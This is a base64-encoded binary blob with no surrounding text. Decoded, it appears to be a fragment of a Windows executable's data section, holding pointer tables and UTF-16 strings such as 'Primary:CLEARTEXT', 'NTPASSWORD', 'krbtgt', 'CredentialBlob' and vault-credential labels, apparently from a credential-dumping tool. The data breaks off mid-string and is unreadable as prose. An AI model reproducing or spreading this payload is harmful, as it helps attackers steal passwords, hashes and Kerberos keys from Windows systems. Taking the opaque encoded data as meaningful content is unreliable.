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AHQAQQBsAGkAYQBzACAAIAAgACAAOgAgACUAcwAKAAAAAAAAACUAKgBzACAAIABDAG8AbQBtAGUAbgB0ACAAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAAAAAJQAqAHMAIAAgAFUAbgBrAEQAYQB0AGEAIAAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAAAAAlACoAcwAgACAAVQBzAGUAcgBOAGEAbQBlACAAIAAgACAAIAAgACAAOgAgACUAcwAKAAAAAAAAACUAKgBzACAAIABDAHIAZQBkAGUAbgB0AGkAYQBsAEIAbABvAGIAIAA6ACAAAAAAACUAdwBaAAAAJQAqAHMAIAAgAEEAdAB0AHIAaQBiAHUAdABlAHMAIAAgACAAIAAgADoAIAAAAAAAJQB1ACAAYQB0AHQAcgBpAGIAdQB0AGUAcwAoAHMAKQAKAAAAAAAAACUAKgBzACoAKgBBAFQAVABSAEkAQgBVAFQARQAqACoACgAAAAAAAAAlACoAcwAgACAARgBsAGEAZwBzACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAACUAKgBzACAAIABLAGUAeQB3AG8AcgBkACAAOgAgACUAcwAKAAAAAAAlACoAcwAgACAAVgBhAGwAdQBlACAAOgAgAAAAAAAAACUAKgBzACoAKgBWAEEAVQBMAFQAIABQAE8ATABJAEMAWQAqACoACgAAAAAAAAAAACUAKgBzACAAIAB2AGUAcgBzAGkAbwBuACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAJQAqAHMAIAAgAHYAYQB1AGwAdAAgACAAIAA6ACAAAAAlACoAcwAgACAATgBhAG0AZQAgACAAIAAgADoAIAAlAHMACgAAAAAAJQAqAHMAIAAgAHUAbgBrADAALwAxAC8AMgA6ACAAJQAwADgAeAAvACUAMAA4AHgALwAlADAAOAB4AAoAAAAAACUAKgBzACoAKgBWAEEAVQBMAFQAIABQAE8ATABJAEMAWQAgAEsARQBZACoAKgAKAAAAAAAAAAAAJQAqAHMAIAAgAHUAbgBrADAAIAAgADoAIAAAAAAAAAAlACoAcwAgACAAdQBuAGsAMQAgACAAOgAgAAAAAAAAACUAKgBzACoAKgBWAEEAVQBMAFQAIABDAFIARQBEAEUATgBUAEkAQQBMACoAKgAKAAAAAAAAAAAAJQAqAHMAIAAgAFMAYwBoAGUAbQBhAEkAZAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAlACoAcwAgACAAdQBuAGsAMAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAACUAKgBzACAAIABMAGEAcwB0AFcAcgBpAHQAdABlAG4AIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAAAAlACoAcwAgACAAdQBuAGsAMQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAACUAKgBzACAAIAB1AG4AawAyACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAJQAqAHMAIAAgAEYAcgBpAGUAbgBkAGwAeQBOAGEAbQBlACAAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAACUAKgBzACAAIABkAHcAQQB0AHQAcgBpAGIAdQB0AGUAcwBNAGEAcABTAGkAegBlACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAJQAqAHMAIAAgACoAIABBAHQAdAByAGkAYgB1AHQAZQAgACUAMwB1ACAAQAAgAG8AZgBmAHMAZQB0ACAAJQAwADgAeAAgAC0AIAAlAHUAIAAgACgAdQBuAGsAIAAlADAAOAB4ACAALQAgACUAdQApAAoAAAAAAAAAAAAAAAAAAAAlACoAcwAqACoAVgBBAFUATABUACAAQwBSAEUARABFAE4AVABJAEEATAAgAEEAVABUAFIASQBCAFUAVABFACoAKgAKAAAAAAAlACoAcwAgACAAaQBkACAAIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAACUAKgBzACAAIABJAFYAIAAgACAAIAAgACAAOgAgAAAAJQAqAHMAIAAgAEQAYQB0AGEAIAAgACAAIAA6ACAAAAAlACoAcwAqACoAVgBBAFUATABUACAAQwBSAEUARABFAE4AVABJAEEATAAgAEMATABFAEEAUgAgAEEAVABUAFIASQBCAFUAVABFAFMAKgAqAAoAAAAAAAAAJQAqAHMAIAAgAHYAZQByAHMAaQBvAG4AOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAlACoAcwAgACAAYwBvAHUAbgB0ACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAAACUAKgBzACAAIAB1AG4AawAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAAAAAJQAqAHMAIAAgACoAIAAAAHIAZQBzAHMAbwB1AHIAYwBlACAAIAAgACAAIAA6ACAAAAAAAAAAAABpAGQAZQBuAHQAaQB0AHkAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAYQB1AHQAaABlAG4AdABpAGMAYQB0AG8AcgAgADoAIAAAAAAAAAAAAHAAcgBvAHAAZQByAHQAeQAgACUAMwB1ACAAIAA6ACAAAAAAACUAcwAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAAAAAAAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAF8ARwBSAE8AVQBQAF8AUABPAEwASQBDAFkAAAAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAF8ARwBSAE8AVQBQAF8AUABPAEwASQBDAFkAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAF8ARQBOAFQARQBSAFAAUgBJAFMARQAAAAAAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBDAFUAUgBSAEUATgBUAF8AUwBFAFIAVgBJAEMARQAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBVAFMARQBSAFMAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBTAEUAUgBWAEkAQwBFAFMAAAAAAE0AUwBfAEQARQBGAF8AUABSAE8AVgAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAgAHYAMQAuADAAAAAAAE0AUwBfAEUATgBIAEEATgBDAEUARABfAFAAUgBPAFYAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAB2